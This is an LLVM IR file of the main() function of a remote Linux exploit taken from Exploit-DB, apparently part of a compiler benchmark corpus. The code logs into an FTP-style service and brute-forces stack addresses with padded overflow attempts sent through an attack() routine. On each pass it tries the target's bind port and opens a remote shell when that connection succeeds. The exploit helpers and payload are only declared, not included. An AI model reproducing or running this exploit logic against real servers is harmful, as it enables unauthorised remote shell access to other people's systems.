; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1295.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1295.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@STACK_START = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"connecting to %s:%d...\00", align 1
@PORT = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c" ok.\00", align 1
@BUFSIZ = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"OK - STARTING ATTACK\0A\00", align 1
@STACK_END = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [37 x i8] c"+++ USING STACK ADDRESS 0x%.08x +++\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"AA\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"AAA\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@BINDPORT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [29 x i8] c"\0ALet's get ready to rumble!\0A\00", align 1
@.str.10 = private unnamed_addr constant [18 x i8] c"\0ALogin incorrect\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [255 x i8], align 16
  %7 = alloca [255 x i8], align 16
  %8 = alloca [255 x i8], align 16
  %9 = alloca [10 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @STACK_START, align 4
  store i32 %16, i32* %12, align 4
  %17 = call i32 (...) @ficken()
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 4
  br i1 %19, label %20, label %23

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = call i32 @usage(i8** %21)
  br label %23

23:                                               ; preds = %20, %2
  %24 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @strncpy(i8* %24, i8* %27, i32 255)
  %29 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 254
  store i8 0, i8* %29, align 2
  %30 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strncpy(i8* %30, i8* %33, i32 255)
  %35 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 254
  store i8 0, i8* %35, align 2
  %36 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 3
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strncpy(i8* %36, i8* %39, i32 255)
  %41 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 254
  store i8 0, i8* %41, align 2
  %42 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %43 = load i32, i32* @PORT, align 4
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i8* %42, i32 %43)
  %45 = load i32, i32* @stdout, align 4
  %46 = call i32 @fflush(i32 %45)
  %47 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %48 = load i32, i32* @PORT, align 4
  %49 = call i32 @do_connect(i8* %47, i32 %48)
  store i32 %49, i32* %13, align 4
  %50 = call i32 @puts(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %51 = load i64, i64* @BUFSIZ, align 8
  %52 = add nsw i64 %51, 10
  %53 = call i64 @malloc(i64 %52)
  %54 = inttoptr i64 %53 to i8*
  store i8* %54, i8** %10, align 8
  %55 = load i64, i64* @BUFSIZ, align 8
  %56 = add nsw i64 %55, 10
  %57 = call i64 @malloc(i64 %56)
  %58 = inttoptr i64 %57 to i8*
  store i8* %58, i8** %11, align 8
  %59 = load i32, i32* %13, align 4
  %60 = load i8*, i8** %10, align 8
  %61 = load i8*, i8** %11, align 8
  %62 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %63 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %64 = call i32 @do_login(i32 %59, i8* %60, i8* %61, i8* %62, i8* %63)
  %65 = load i8*, i8** %10, align 8
  %66 = call i32* @strstr(i8* %65, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  %67 = icmp ne i32* %66, null
  br i1 %67, label %68, label %147

68:                                               ; preds = %23
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %15, align 4
  br label %70

70:                                               ; preds = %141, %68
  %71 = load i32, i32* %12, align 4
  %72 = load i32, i32* @STACK_END, align 4
  %73 = icmp sle i32 %71, %72
  br i1 %73, label %74, label %146

74:                                               ; preds = %70
  %75 = load i32, i32* %12, align 4
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0), i32 %75)
  %77 = call i32 @sleep(i32 1)
  %78 = load i32, i32* %15, align 4
  %79 = icmp eq i32 %78, 1
  br i1 %79, label %80, label %83

80:                                               ; preds = %74
  %81 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %82 = call i32 @strcpy(i8* %81, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  br label %83

83:                                               ; preds = %80, %74
  %84 = load i32, i32* %15, align 4
  %85 = icmp eq i32 %84, 2
  br i1 %85, label %86, label %89

86:                                               ; preds = %83
  %87 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %88 = call i32 @strcpy(i8* %87, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  br label %89

89:                                               ; preds = %86, %83
  %90 = load i32, i32* %15, align 4
  %91 = icmp eq i32 %90, 3
  br i1 %91, label %92, label %95

92:                                               ; preds = %89
  %93 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %94 = call i32 @strcpy(i8* %93, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %15, align 4
  br label %95

95:                                               ; preds = %92, %89
  %96 = load i32, i32* %13, align 4
  %97 = load i32, i32* %12, align 4
  %98 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %99 = call i32 @attack(i32 %96, i32 %97, i8* %98)
  %100 = load i32, i32* %13, align 4
  %101 = call i32 @close(i32 %100)
  %102 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %103 = load i32, i32* @PORT, align 4
  %104 = call i32 @do_connect(i8* %102, i32 %103)
  store i32 %104, i32* %13, align 4
  %105 = load i32, i32* %13, align 4
  %106 = load i8*, i8** %10, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %109 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %110 = call i32 @do_login(i32 %105, i8* %106, i8* %107, i8* %108, i8* %109)
  %111 = load i8**, i8*** %5, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 4
  %113 = load i8*, i8** %112, align 8
  %114 = icmp ne i8* %113, null
  br i1 %114, label %115, label %131

115:                                              ; preds = %95
  %116 = load i8*, i8** %11, align 8
  %117 = load i64, i64* @BUFSIZ, align 8
  %118 = load i8**, i8*** %5, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 4
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @snprintf(i8* %116, i64 %117, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0), i8* %120)
  %122 = load i32, i32* %13, align 4
  %123 = load i8*, i8** %11, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i32 @strlen(i8* %124)
  %126 = call i32 @send(i32 %122, i8* %123, i32 %125, i32 0)
  %127 = load i32, i32* %13, align 4
  %128 = load i8*, i8** %10, align 8
  %129 = load i64, i64* @BUFSIZ, align 8
  %130 = call i32 @recv(i32 %127, i8* %128, i64 %129, i32 0)
  br label %131

131:                                              ; preds = %115, %95
  %132 = getelementptr inbounds [255 x i8], [255 x i8]* %6, i64 0, i64 0
  %133 = load i32, i32* @BINDPORT, align 4
  %134 = call i32 @do_connect(i8* %132, i32 %133)
  store i32 %134, i32* %14, align 4
  %135 = icmp sgt i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %131
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.9, i64 0, i64 0))
  %138 = load i32, i32* %14, align 4
  %139 = call i32 @do_remote_shell(i32 %138)
  %140 = call i32 @exit(i32 0) #3
  unreachable

141:                                              ; preds = %131
  %142 = load i32, i32* %12, align 4
  %143 = add nsw i32 %142, 16
  store i32 %143, i32* %12, align 4
  %144 = load i32, i32* %15, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %15, align 4
  br label %70

146:                                              ; preds = %70
  br label %150

147:                                              ; preds = %23
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.10, i64 0, i64 0))
  %149 = call i32 @exit(i32 1) #3
  unreachable

150:                                              ; preds = %146
  %151 = load i8*, i8** %10, align 8
  %152 = call i32 @free(i8* %151)
  %153 = load i8*, i8** %11, align 8
  %154 = call i32 @free(i8* %153)
  ret i32 0
}

declare dso_local i32 @ficken(...) #1

declare dso_local i32 @usage(i8**) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @do_connect(i8*, i32) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i64 @malloc(i64) #1

declare dso_local i32 @do_login(i32, i8*, i8*, i8*, i8*) #1

declare dso_local i32* @strstr(i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @attack(i32, i32, i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @snprintf(i8*, i64, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i64, i32) #1

declare dso_local i32 @do_remote_shell(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
